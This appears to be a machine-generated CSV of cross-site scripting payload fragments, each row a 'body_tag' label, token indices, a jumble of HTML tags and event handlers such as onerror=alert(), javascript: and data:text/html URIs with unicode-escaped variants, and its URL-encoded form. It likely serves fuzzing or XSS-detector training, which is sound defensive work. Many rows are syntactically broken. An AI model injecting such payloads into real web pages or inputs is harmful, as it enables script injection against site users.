body_tag,"[10, 2, 35, 13, 28]",<option/<video><source <embed </img></object>,%3Coption/%3Cvideo%3E%3Csource%20%3Cembed%20%3C/img%3E%3C/object%3E
body_tag,"[6, 27, 38, 0, 15]",<a <object/src=x <script><body/,%3Ca%20%3Cobject/src%3Dx%20%3Cscript%3E%3Cbody/
body_tag,"[54, 49, 39, 49, 61]",onload=alert();onerror=\u0061lert();src=/ onerror=\u0061lert();al\u0065rt();,onload%3Dalert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20onerror%3D%5Cu0061lert%28%29%3Bal%5Cu0065rt%28%29%3B
body_tag,"[8, 11, 12, 26, 38]",</a><img <img/<object src=x ,%3C/a%3E%3Cimg%20%3Cimg/%3Cobject%20src%3Dx%20
body_tag,"[72, 27, 40, 29, 40]",#<object/src=  <select src=  ,%23%3Cobject/src%3D%20%20%3Cselect%20src%3D%20%20
body_tag,"[30, 48, 72, 23, 23]",<select/onerror=javascript:alert();#</frameset></frameset>,%3Cselect/onerror%3Djavascript%3Aalert%28%29%3B%23%3C/frameset%3E%3C/frameset%3E
body_tag,"[74, 30, 41, 54, 72]"," <select/src=""data:text/html,onload=alert();#",%20%3Cselect/src%3D%22data%3Atext/html%2Conload%3Dalert%28%29%3B%23
body_tag,"[34, 27, 69, 44, 50]","</canvas><object/<type=""text/x-scriptlet"" onerror=al\u0065rt();",%3C/canvas%3E%3Cobject/%3Ctype%3D%22text/x-scriptlet%22%20onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[3, 63, 35, 40, 67]",<video><source/\u0061lert``;<embed src=  >,%3Cvideo%3E%3Csource/%5Cu0061lert%60%60%3B%3Cembed%20src%3D%20%20%3E
body_tag,"[58, 38, 35, 21, 2]",saivs.js src=x <embed <frameset><frame <video><source ,saivs.js%20src%3Dx%20%3Cembed%20%3Cframeset%3E%3Cframe%20%3Cvideo%3E%3Csource%20
body_tag,"[4, 54, 18, 62, 35]",<script onload=alert();<iframe alert``;<embed ,%3Cscript%20onload%3Dalert%28%29%3B%3Ciframe%20alert%60%60%3B%3Cembed%20
body_tag,"[57, 14, 2, 10, 16]",onerror=alert();<body <video><source <option/<input ,onerror%3Dalert%28%29%3B%3Cbody%20%3Cvideo%3E%3Csource%20%3Coption/%3Cinput%20
body_tag,"[0, 54, 73, 35, 15]",<script>onload=alert();/<embed <body/,%3Cscript%3Eonload%3Dalert%28%29%3B/%3Cembed%20%3Cbody/
body_tag,"[64, 64, 29, 26, 48]",al\u0065rt``;al\u0065rt``;<select <object onerror=javascript:alert();,al%5Cu0065rt%60%60%3Bal%5Cu0065rt%60%60%3B%3Cselect%20%3Cobject%20onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[45, 45, 26, 10, 66]",data=saivs.html data=saivs.html <object <option/prompt(1);,data%3Dsaivs.html%20data%3Dsaivs.html%20%3Cobject%20%3Coption/prompt%281%29%3B
body_tag,"[71, 16, 45, 45, 32]",'<input data=saivs.html data=saivs.html <canvas ,%27%3Cinput%20data%3Dsaivs.html%20data%3Dsaivs.html%20%3Ccanvas%20
body_tag,"[48, 4, 12, 55, 64]","onerror=javascript:alert();<script <img/onload=alert();""al\u0065rt``;",onerror%3Djavascript%3Aalert%28%29%3B%3Cscript%20%3Cimg/onload%3Dalert%28%29%3B%22al%5Cu0065rt%60%60%3B
body_tag,"[22, 34, 16, 3, 12]",<frameset><frame/</canvas><input <video><source/<img/,%3Cframeset%3E%3Cframe/%3C/canvas%3E%3Cinput%20%3Cvideo%3E%3Csource/%3Cimg/
body_tag,"[9, 50, 21, 67, 67]",<option onerror=al\u0065rt();<frameset><frame >>,%3Coption%20onerror%3Dal%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe%20%3E%3E
body_tag,"[39, 6, 33, 40, 74]",src=/ <a <canvas/src=   ,src%3D/%20%3Ca%20%3Ccanvas/src%3D%20%20%20
body_tag,"[8, 49, 60, 29, 29]",</a>onerror=\u0061lert();\u0061lert();<select <select ,%3C/a%3Eonerror%3D%5Cu0061lert%28%29%3B%5Cu0061lert%28%29%3B%3Cselect%20%3Cselect%20
body_tag,"[46, 11, 10, 32, 9]","data=""data:text/html,<img <option/<canvas <option ",data%3D%22data%3Atext/html%2C%3Cimg%20%3Coption/%3Ccanvas%20%3Coption%20
body_tag,"[40, 68, 62, 51, 18]",src=   />alert``;javascript:alert();<iframe ,src%3D%20%20%20/%3Ealert%60%60%3Bjavascript%3Aalert%28%29%3B%3Ciframe%20
body_tag,"[14, 48, 57, 28, 39]",<body onerror=javascript:alert();onerror=alert();</object>src=/ ,%3Cbody%20onerror%3Djavascript%3Aalert%28%29%3Bonerror%3Dalert%28%29%3B%3C/object%3Esrc%3D/%20
body_tag,"[42, 47, 22, 6, 27]",src=saivs.js data=<frameset><frame/<a <object/,src%3Dsaivs.js%20data%3D%3Cframeset%3E%3Cframe/%3Ca%20%3Cobject/
body_tag,"[56, 59, 32, 67, 12]",onmouseover=alert();alert();<canvas ><img/,onmouseover%3Dalert%28%29%3Balert%28%29%3B%3Ccanvas%20%3E%3Cimg/
body_tag,"[61, 42, 50, 49, 32]",al\u0065rt();src=saivs.js onerror=al\u0065rt();onerror=\u0061lert();<canvas ,al%5Cu0065rt%28%29%3Bsrc%3Dsaivs.js%20onerror%3Dal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B%3Ccanvas%20
body_tag,"[8, 73, 44, 27, 11]","</a>/type=""text/x-scriptlet"" <object/<img ",%3C/a%3E/type%3D%22text/x-scriptlet%22%20%3Cobject/%3Cimg%20
body_tag,"[48, 71, 14, 72, 37]",onerror=javascript:alert();'<body #</embed>,onerror%3Djavascript%3Aalert%28%29%3B%27%3Cbody%20%23%3C/embed%3E
body_tag,"[59, 57, 33, 62, 34]",alert();onerror=alert();<canvas/alert``;</canvas>,alert%28%29%3Bonerror%3Dalert%28%29%3B%3Ccanvas/alert%60%60%3B%3C/canvas%3E
body_tag,"[52, 40, 54, 15, 47]",javascript:\u0061lert();src=  onload=alert();<body/data=,javascript%3A%5Cu0061lert%28%29%3Bsrc%3D%20%20onload%3Dalert%28%29%3B%3Cbody/data%3D
body_tag,"[17, 52, 64, 27, 11]",<input/javascript:\u0061lert();al\u0065rt``;<object/<img ,%3Cinput/javascript%3A%5Cu0061lert%28%29%3Bal%5Cu0065rt%60%60%3B%3Cobject/%3Cimg%20
body_tag,"[54, 13, 64, 12, 34]",onload=alert();</img>al\u0065rt``;<img/</canvas>,onload%3Dalert%28%29%3B%3C/img%3Eal%5Cu0065rt%60%60%3B%3Cimg/%3C/canvas%3E
body_tag,"[70, 59, 9, 40, 22]","""alert();<option src=  <frameset><frame/",%22alert%28%29%3B%3Coption%20src%3D%20%20%3Cframeset%3E%3Cframe/
body_tag,"[51, 30, 29, 17, 74]",javascript:alert();<select/<select <input/ ,javascript%3Aalert%28%29%3B%3Cselect/%3Cselect%20%3Cinput/%20
body_tag,"[21, 71, 3, 6, 63]",<frameset><frame '<video><source/<a \u0061lert``;,%3Cframeset%3E%3Cframe%20%27%3Cvideo%3E%3Csource/%3Ca%20%5Cu0061lert%60%60%3B
body_tag,"[45, 2, 33, 51, 9]",data=saivs.html <video><source <canvas/javascript:alert();<option ,data%3Dsaivs.html%20%3Cvideo%3E%3Csource%20%3Ccanvas/javascript%3Aalert%28%29%3B%3Coption%20
body_tag,"[46, 16, 26, 71, 64]","data=""data:text/html,<input <object 'al\u0065rt``;",data%3D%22data%3Atext/html%2C%3Cinput%20%3Cobject%20%27al%5Cu0065rt%60%60%3B
body_tag,"[32, 69, 15, 42, 47]",<canvas <<body/src=saivs.js data=,%3Ccanvas%20%3C%3Cbody/src%3Dsaivs.js%20data%3D
body_tag,"[62, 59, 56, 53, 25]",alert``;alert();onmouseover=alert();javascript:al\u0065rt();<svg/,alert%60%60%3Balert%28%29%3Bonmouseover%3Dalert%28%29%3Bjavascript%3Aal%5Cu0065rt%28%29%3B%3Csvg/
body_tag,"[48, 74, 18, 31, 23]",onerror=javascript:alert(); <iframe </select></frameset>,onerror%3Djavascript%3Aalert%28%29%3B%20%3Ciframe%20%3C/select%3E%3C/frameset%3E
body_tag,"[45, 41, 33, 47, 73]","data=saivs.html src=""data:text/html,<canvas/data=/",data%3Dsaivs.html%20src%3D%22data%3Atext/html%2C%3Ccanvas/data%3D/
body_tag,"[34, 56, 45, 72, 46]","</canvas>onmouseover=alert();data=saivs.html #data=""data:text/html,",%3C/canvas%3Eonmouseover%3Dalert%28%29%3Bdata%3Dsaivs.html%20%23data%3D%22data%3Atext/html%2C
body_tag,"[38, 60, 51, 18, 58]",src=x \u0061lert();javascript:alert();<iframe saivs.js ,src%3Dx%20%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3Ciframe%20saivs.js%20
body_tag,"[22, 7, 57, 51, 62]",<frameset><frame/<a/onerror=alert();javascript:alert();alert``;,%3Cframeset%3E%3Cframe/%3Ca/onerror%3Dalert%28%29%3Bjavascript%3Aalert%28%29%3Balert%60%60%3B
body_tag,"[42, 13, 16, 74, 19]",src=saivs.js </img><input  <iframe/,src%3Dsaivs.js%20%3C/img%3E%3Cinput%20%20%3Ciframe/
body_tag,"[23, 30, 64, 70, 67]","</frameset><select/al\u0065rt``;"">",%3C/frameset%3E%3Cselect/al%5Cu0065rt%60%60%3B%22%3E
body_tag,"[33, 36, 41, 3, 39]","<canvas/<embed/src=""data:text/html,<video><source/src=/ ",%3Ccanvas/%3Cembed/src%3D%22data%3Atext/html%2C%3Cvideo%3E%3Csource/src%3D/%20
body_tag,"[52, 33, 31, 2, 40]",javascript:\u0061lert();<canvas/</select><video><source src=  ,javascript%3A%5Cu0061lert%28%29%3B%3Ccanvas/%3C/select%3E%3Cvideo%3E%3Csource%20src%3D%20%20
body_tag,"[12, 62, 66, 8, 45]",<img/alert``;prompt(1);</a>data=saivs.html ,%3Cimg/alert%60%60%3Bprompt%281%29%3B%3C/a%3Edata%3Dsaivs.html%20
body_tag,"[15, 55, 1, 10, 27]","<body/onload=alert();""</script><option/<object/",%3Cbody/onload%3Dalert%28%29%3B%22%3C/script%3E%3Coption/%3Cobject/
body_tag,"[66, 59, 21, 72, 3]",prompt(1);alert();<frameset><frame #<video><source/,prompt%281%29%3Balert%28%29%3B%3Cframeset%3E%3Cframe%20%23%3Cvideo%3E%3Csource/
body_tag,"[45, 64, 12, 33, 47]",data=saivs.html al\u0065rt``;<img/<canvas/data=,data%3Dsaivs.html%20al%5Cu0065rt%60%60%3B%3Cimg/%3Ccanvas/data%3D
body_tag,"[54, 6, 70, 14, 46]","onload=alert();<a ""<body data=""data:text/html,",onload%3Dalert%28%29%3B%3Ca%20%22%3Cbody%20data%3D%22data%3Atext/html%2C
body_tag,"[50, 27, 56, 20, 18]",onerror=al\u0065rt();<object/onmouseover=alert();</iframe><iframe ,onerror%3Dal%5Cu0065rt%28%29%3B%3Cobject/onmouseover%3Dalert%28%29%3B%3C/iframe%3E%3Ciframe%20
body_tag,"[3, 27, 51, 68, 66]",<video><source/<object/javascript:alert(); />prompt(1);,%3Cvideo%3E%3Csource/%3Cobject/javascript%3Aalert%28%29%3B%20/%3Eprompt%281%29%3B
body_tag,"[68, 31, 11, 61, 26]", /></select><img al\u0065rt();<object ,%20/%3E%3C/select%3E%3Cimg%20al%5Cu0065rt%28%29%3B%3Cobject%20
body_tag,"[29, 14, 60, 9, 32]",<select <body \u0061lert();<option <canvas ,%3Cselect%20%3Cbody%20%5Cu0061lert%28%29%3B%3Coption%20%3Ccanvas%20
body_tag,"[23, 40, 66, 17, 24]",</frameset>src=  prompt(1);<input/<svg ,%3C/frameset%3Esrc%3D%20%20prompt%281%29%3B%3Cinput/%3Csvg%20
body_tag,"[46, 56, 45, 2, 3]","data=""data:text/html,onmouseover=alert();data=saivs.html <video><source <video><source/",data%3D%22data%3Atext/html%2Conmouseover%3Dalert%28%29%3Bdata%3Dsaivs.html%20%3Cvideo%3E%3Csource%20%3Cvideo%3E%3Csource/
body_tag,"[64, 48, 27, 33, 17]",al\u0065rt``;onerror=javascript:alert();<object/<canvas/<input/,al%5Cu0065rt%60%60%3Bonerror%3Djavascript%3Aalert%28%29%3B%3Cobject/%3Ccanvas/%3Cinput/
body_tag,"[26, 19, 62, 10, 30]",<object <iframe/alert``;<option/<select/,%3Cobject%20%3Ciframe/alert%60%60%3B%3Coption/%3Cselect/
body_tag,"[23, 67, 55, 53, 10]","</frameset>>onload=alert();""javascript:al\u0065rt();<option/",%3C/frameset%3E%3Eonload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B%3Coption/
body_tag,"[6, 48, 26, 67, 27]",<a onerror=javascript:alert();<object ><object/,%3Ca%20onerror%3Djavascript%3Aalert%28%29%3B%3Cobject%20%3E%3Cobject/
body_tag,"[57, 11, 23, 54, 41]","onerror=alert();<img </frameset>onload=alert();src=""data:text/html,",onerror%3Dalert%28%29%3B%3Cimg%20%3C/frameset%3Eonload%3Dalert%28%29%3Bsrc%3D%22data%3Atext/html%2C
body_tag,"[25, 54, 40, 46, 2]","<svg/onload=alert();src=  data=""data:text/html,<video><source ",%3Csvg/onload%3Dalert%28%29%3Bsrc%3D%20%20data%3D%22data%3Atext/html%2C%3Cvideo%3E%3Csource%20
body_tag,"[14, 1, 36, 72, 64]",<body </script><embed/#al\u0065rt``;,%3Cbody%20%3C/script%3E%3Cembed/%23al%5Cu0065rt%60%60%3B
body_tag,"[13, 34, 4, 9, 61]",</img></canvas><script <option al\u0065rt();,%3C/img%3E%3C/canvas%3E%3Cscript%20%3Coption%20al%5Cu0065rt%28%29%3B
body_tag,"[40, 3, 69, 38, 36]",src=  <video><source/<src=x <embed/,src%3D%20%20%3Cvideo%3E%3Csource/%3Csrc%3Dx%20%3Cembed/
body_tag,"[38, 47, 41, 1, 20]","src=x data=src=""data:text/html,</script></iframe>",src%3Dx%20data%3Dsrc%3D%22data%3Atext/html%2C%3C/script%3E%3C/iframe%3E
body_tag,"[55, 36, 49, 69, 36]","onload=alert();""<embed/onerror=\u0061lert();<<embed/",onload%3Dalert%28%29%3B%22%3Cembed/onerror%3D%5Cu0061lert%28%29%3B%3C%3Cembed/
body_tag,"[28, 70, 4, 39, 24]","</object>""<script src=/ <svg ",%3C/object%3E%22%3Cscript%20src%3D/%20%3Csvg%20
body_tag,"[48, 27, 56, 54, 60]",onerror=javascript:alert();<object/onmouseover=alert();onload=alert();\u0061lert();,onerror%3Djavascript%3Aalert%28%29%3B%3Cobject/onmouseover%3Dalert%28%29%3Bonload%3Dalert%28%29%3B%5Cu0061lert%28%29%3B
body_tag,"[29, 19, 38, 44, 53]","<select <iframe/src=x type=""text/x-scriptlet"" javascript:al\u0065rt();",%3Cselect%20%3Ciframe/src%3Dx%20type%3D%22text/x-scriptlet%22%20javascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[72, 0, 36, 49, 32]",#<script><embed/onerror=\u0061lert();<canvas ,%23%3Cscript%3E%3Cembed/onerror%3D%5Cu0061lert%28%29%3B%3Ccanvas%20
body_tag,"[50, 68, 13, 66, 69]",onerror=al\u0065rt(); /></img>prompt(1);<,onerror%3Dal%5Cu0065rt%28%29%3B%20/%3E%3C/img%3Eprompt%281%29%3B%3C
body_tag,"[38, 24, 56, 20, 54]",src=x <svg onmouseover=alert();</iframe>onload=alert();,src%3Dx%20%3Csvg%20onmouseover%3Dalert%28%29%3B%3C/iframe%3Eonload%3Dalert%28%29%3B
body_tag,"[28, 66, 14, 66, 25]",</object>prompt(1);<body prompt(1);<svg/,%3C/object%3Eprompt%281%29%3B%3Cbody%20prompt%281%29%3B%3Csvg/
body_tag,"[3, 67, 57, 65, 62]",<video><source/>onerror=alert();confirm(1);alert``;,%3Cvideo%3E%3Csource/%3Eonerror%3Dalert%28%29%3Bconfirm%281%29%3Balert%60%60%3B
body_tag,"[40, 2, 66, 1, 34]",src=  <video><source prompt(1);</script></canvas>,src%3D%20%20%3Cvideo%3E%3Csource%20prompt%281%29%3B%3C/script%3E%3C/canvas%3E
body_tag,"[14, 20, 51, 66, 29]",<body </iframe>javascript:alert();prompt(1);<select ,%3Cbody%20%3C/iframe%3Ejavascript%3Aalert%28%29%3Bprompt%281%29%3B%3Cselect%20
body_tag,"[3, 21, 5, 67, 49]",<video><source/<frameset><frame <script/>onerror=\u0061lert();,%3Cvideo%3E%3Csource/%3Cframeset%3E%3Cframe%20%3Cscript/%3Eonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[10, 27, 42, 29, 35]",<option/<object/src=saivs.js <select <embed ,%3Coption/%3Cobject/src%3Dsaivs.js%20%3Cselect%20%3Cembed%20
body_tag,"[40, 25, 31, 24, 16]",src=  <svg/</select><svg <input ,src%3D%20%20%3Csvg/%3C/select%3E%3Csvg%20%3Cinput%20
body_tag,"[69, 45, 70, 67, 67]","<data=saivs.html "">>",%3Cdata%3Dsaivs.html%20%22%3E%3E
body_tag,"[74, 2, 59, 74, 74]", <video><source alert();  ,%20%3Cvideo%3E%3Csource%20alert%28%29%3B%20%20
body_tag,"[45, 66, 23, 55, 34]","data=saivs.html prompt(1);</frameset>onload=alert();""</canvas>",data%3Dsaivs.html%20prompt%281%29%3B%3C/frameset%3Eonload%3Dalert%28%29%3B%22%3C/canvas%3E
body_tag,"[43, 20, 2, 3, 48]","type=""image"" </iframe><video><source <video><source/onerror=javascript:alert();",type%3D%22image%22%20%3C/iframe%3E%3Cvideo%3E%3Csource%20%3Cvideo%3E%3Csource/onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[0, 45, 62, 73, 53]",<script>data=saivs.html alert``;/javascript:al\u0065rt();,%3Cscript%3Edata%3Dsaivs.html%20alert%60%60%3B/javascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[27, 69, 54, 14, 5]",<object/<onload=alert();<body <script/,%3Cobject/%3Conload%3Dalert%28%29%3B%3Cbody%20%3Cscript/
body_tag,"[40, 57, 16, 42, 11]",src=  onerror=alert();<input src=saivs.js <img ,src%3D%20%20onerror%3Dalert%28%29%3B%3Cinput%20src%3Dsaivs.js%20%3Cimg%20
body_tag,"[1, 72, 60, 51, 31]",</script>#\u0061lert();javascript:alert();</select>,%3C/script%3E%23%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3C/select%3E
body_tag,"[74, 60, 27, 46, 40]"," \u0061lert();<object/data=""data:text/html,src=  ",%20%5Cu0061lert%28%29%3B%3Cobject/data%3D%22data%3Atext/html%2Csrc%3D%20%20
body_tag,"[35, 2, 69, 55, 54]","<embed <video><source <onload=alert();""onload=alert();",%3Cembed%20%3Cvideo%3E%3Csource%20%3Conload%3Dalert%28%29%3B%22onload%3Dalert%28%29%3B
body_tag,"[36, 29, 60, 41, 55]","<embed/<select \u0061lert();src=""data:text/html,onload=alert();""",%3Cembed/%3Cselect%20%5Cu0061lert%28%29%3Bsrc%3D%22data%3Atext/html%2Conload%3Dalert%28%29%3B%22
body_tag,"[38, 48, 44, 52, 6]","src=x onerror=javascript:alert();type=""text/x-scriptlet"" javascript:\u0061lert();<a ",src%3Dx%20onerror%3Djavascript%3Aalert%28%29%3Btype%3D%22text/x-scriptlet%22%20javascript%3A%5Cu0061lert%28%29%3B%3Ca%20
body_tag,"[17, 68, 26, 18, 74]",<input/ /><object <iframe  ,%3Cinput/%20/%3E%3Cobject%20%3Ciframe%20%20
body_tag,"[4, 72, 4, 68, 37]",<script #<script  /></embed>,%3Cscript%20%23%3Cscript%20%20/%3E%3C/embed%3E
body_tag,"[50, 16, 62, 43, 35]","onerror=al\u0065rt();<input alert``;type=""image"" <embed ",onerror%3Dal%5Cu0065rt%28%29%3B%3Cinput%20alert%60%60%3Btype%3D%22image%22%20%3Cembed%20
body_tag,"[66, 24, 31, 52, 59]",prompt(1);<svg </select>javascript:\u0061lert();alert();,prompt%281%29%3B%3Csvg%20%3C/select%3Ejavascript%3A%5Cu0061lert%28%29%3Balert%28%29%3B
body_tag,"[14, 74, 29, 58, 51]",<body  <select saivs.js javascript:alert();,%3Cbody%20%20%3Cselect%20saivs.js%20javascript%3Aalert%28%29%3B
body_tag,"[35, 19, 16, 19, 63]",<embed <iframe/<input <iframe/\u0061lert``;,%3Cembed%20%3Ciframe/%3Cinput%20%3Ciframe/%5Cu0061lert%60%60%3B
body_tag,"[28, 28, 37, 65, 6]",</object></object></embed>confirm(1);<a ,%3C/object%3E%3C/object%3E%3C/embed%3Econfirm%281%29%3B%3Ca%20
body_tag,"[66, 7, 67, 3, 46]","prompt(1);<a/><video><source/data=""data:text/html,",prompt%281%29%3B%3Ca/%3E%3Cvideo%3E%3Csource/data%3D%22data%3Atext/html%2C
body_tag,"[49, 37, 43, 61, 3]","onerror=\u0061lert();</embed>type=""image"" al\u0065rt();<video><source/",onerror%3D%5Cu0061lert%28%29%3B%3C/embed%3Etype%3D%22image%22%20al%5Cu0065rt%28%29%3B%3Cvideo%3E%3Csource/
body_tag,"[70, 36, 49, 13, 73]","""<embed/onerror=\u0061lert();</img>/",%22%3Cembed/onerror%3D%5Cu0061lert%28%29%3B%3C/img%3E/
body_tag,"[64, 24, 15, 71, 68]",al\u0065rt``;<svg <body/' />,al%5Cu0065rt%60%60%3B%3Csvg%20%3Cbody/%27%20/%3E
body_tag,"[19, 26, 1, 43, 7]","<iframe/<object </script>type=""image"" <a/",%3Ciframe/%3Cobject%20%3C/script%3Etype%3D%22image%22%20%3Ca/
body_tag,"[7, 73, 49, 3, 52]",<a//onerror=\u0061lert();<video><source/javascript:\u0061lert();,%3Ca//onerror%3D%5Cu0061lert%28%29%3B%3Cvideo%3E%3Csource/javascript%3A%5Cu0061lert%28%29%3B
body_tag,"[54, 24, 51, 20, 37]",onload=alert();<svg javascript:alert();</iframe></embed>,onload%3Dalert%28%29%3B%3Csvg%20javascript%3Aalert%28%29%3B%3C/iframe%3E%3C/embed%3E
body_tag,"[8, 37, 64, 2, 30]",</a></embed>al\u0065rt``;<video><source <select/,%3C/a%3E%3C/embed%3Eal%5Cu0065rt%60%60%3B%3Cvideo%3E%3Csource%20%3Cselect/
body_tag,"[62, 0, 49, 30, 16]",alert``;<script>onerror=\u0061lert();<select/<input ,alert%60%60%3B%3Cscript%3Eonerror%3D%5Cu0061lert%28%29%3B%3Cselect/%3Cinput%20
body_tag,"[15, 27, 71, 40, 11]",<body/<object/'src=  <img ,%3Cbody/%3Cobject/%27src%3D%20%20%3Cimg%20
body_tag,"[47, 26, 65, 19, 10]",data=<object confirm(1);<iframe/<option/,data%3D%3Cobject%20confirm%281%29%3B%3Ciframe/%3Coption/
body_tag,"[65, 68, 51, 41, 14]","confirm(1); />javascript:alert();src=""data:text/html,<body ",confirm%281%29%3B%20/%3Ejavascript%3Aalert%28%29%3Bsrc%3D%22data%3Atext/html%2C%3Cbody%20
body_tag,"[15, 62, 73, 49, 5]",<body/alert``;/onerror=\u0061lert();<script/,%3Cbody/alert%60%60%3B/onerror%3D%5Cu0061lert%28%29%3B%3Cscript/
body_tag,"[24, 2, 24, 30, 66]",<svg <video><source <svg <select/prompt(1);,%3Csvg%20%3Cvideo%3E%3Csource%20%3Csvg%20%3Cselect/prompt%281%29%3B
body_tag,"[72, 29, 29, 46, 71]","#<select <select data=""data:text/html,'",%23%3Cselect%20%3Cselect%20data%3D%22data%3Atext/html%2C%27
body_tag,"[30, 44, 69, 44, 37]","<select/type=""text/x-scriptlet"" <type=""text/x-scriptlet"" </embed>",%3Cselect/type%3D%22text/x-scriptlet%22%20%3Ctype%3D%22text/x-scriptlet%22%20%3C/embed%3E
body_tag,"[74, 9, 14, 62, 50]", <option <body alert``;onerror=al\u0065rt();,%20%3Coption%20%3Cbody%20alert%60%60%3Bonerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[38, 54, 59, 31, 70]","src=x onload=alert();alert();</select>""",src%3Dx%20onload%3Dalert%28%29%3Balert%28%29%3B%3C/select%3E%22
body_tag,"[38, 29, 4, 51, 3]",src=x <select <script javascript:alert();<video><source/,src%3Dx%20%3Cselect%20%3Cscript%20javascript%3Aalert%28%29%3B%3Cvideo%3E%3Csource/
body_tag,"[9, 74, 45, 27, 34]",<option  data=saivs.html <object/</canvas>,%3Coption%20%20data%3Dsaivs.html%20%3Cobject/%3C/canvas%3E
body_tag,"[31, 24, 70, 53, 54]","</select><svg ""javascript:al\u0065rt();onload=alert();",%3C/select%3E%3Csvg%20%22javascript%3Aal%5Cu0065rt%28%29%3Bonload%3Dalert%28%29%3B
body_tag,"[7, 32, 58, 59, 20]",<a/<canvas saivs.js alert();</iframe>,%3Ca/%3Ccanvas%20saivs.js%20alert%28%29%3B%3C/iframe%3E
body_tag,"[5, 46, 74, 2, 45]","<script/data=""data:text/html, <video><source data=saivs.html ",%3Cscript/data%3D%22data%3Atext/html%2C%20%3Cvideo%3E%3Csource%20data%3Dsaivs.html%20
body_tag,"[54, 13, 39, 71, 0]",onload=alert();</img>src=/ '<script>,onload%3Dalert%28%29%3B%3C/img%3Esrc%3D/%20%27%3Cscript%3E
body_tag,"[43, 32, 43, 20, 60]","type=""image"" <canvas type=""image"" </iframe>\u0061lert();",type%3D%22image%22%20%3Ccanvas%20type%3D%22image%22%20%3C/iframe%3E%5Cu0061lert%28%29%3B
body_tag,"[22, 46, 37, 45, 46]","<frameset><frame/data=""data:text/html,</embed>data=saivs.html data=""data:text/html,",%3Cframeset%3E%3Cframe/data%3D%22data%3Atext/html%2C%3C/embed%3Edata%3Dsaivs.html%20data%3D%22data%3Atext/html%2C
body_tag,"[23, 27, 66, 28, 34]",</frameset><object/prompt(1);</object></canvas>,%3C/frameset%3E%3Cobject/prompt%281%29%3B%3C/object%3E%3C/canvas%3E
body_tag,"[13, 5, 24, 53, 64]",</img><script/<svg javascript:al\u0065rt();al\u0065rt``;,%3C/img%3E%3Cscript/%3Csvg%20javascript%3Aal%5Cu0065rt%28%29%3Bal%5Cu0065rt%60%60%3B
body_tag,"[11, 31, 14, 59, 51]",<img </select><body alert();javascript:alert();,%3Cimg%20%3C/select%3E%3Cbody%20alert%28%29%3Bjavascript%3Aalert%28%29%3B
body_tag,"[63, 12, 59, 70, 51]","\u0061lert``;<img/alert();""javascript:alert();",%5Cu0061lert%60%60%3B%3Cimg/alert%28%29%3B%22javascript%3Aalert%28%29%3B
body_tag,"[45, 35, 61, 50, 8]",data=saivs.html <embed al\u0065rt();onerror=al\u0065rt();</a>,data%3Dsaivs.html%20%3Cembed%20al%5Cu0065rt%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B%3C/a%3E
body_tag,"[21, 22, 18, 67, 47]",<frameset><frame <frameset><frame/<iframe >data=,%3Cframeset%3E%3Cframe%20%3Cframeset%3E%3Cframe/%3Ciframe%20%3Edata%3D
body_tag,"[29, 3, 41, 15, 51]","<select <video><source/src=""data:text/html,<body/javascript:alert();",%3Cselect%20%3Cvideo%3E%3Csource/src%3D%22data%3Atext/html%2C%3Cbody/javascript%3Aalert%28%29%3B
body_tag,"[6, 70, 36, 71, 51]","<a ""<embed/'javascript:alert();",%3Ca%20%22%3Cembed/%27javascript%3Aalert%28%29%3B
body_tag,"[61, 14, 14, 60, 20]",al\u0065rt();<body <body \u0061lert();</iframe>,al%5Cu0065rt%28%29%3B%3Cbody%20%3Cbody%20%5Cu0061lert%28%29%3B%3C/iframe%3E
body_tag,"[2, 61, 24, 60, 59]",<video><source al\u0065rt();<svg \u0061lert();alert();,%3Cvideo%3E%3Csource%20al%5Cu0065rt%28%29%3B%3Csvg%20%5Cu0061lert%28%29%3Balert%28%29%3B
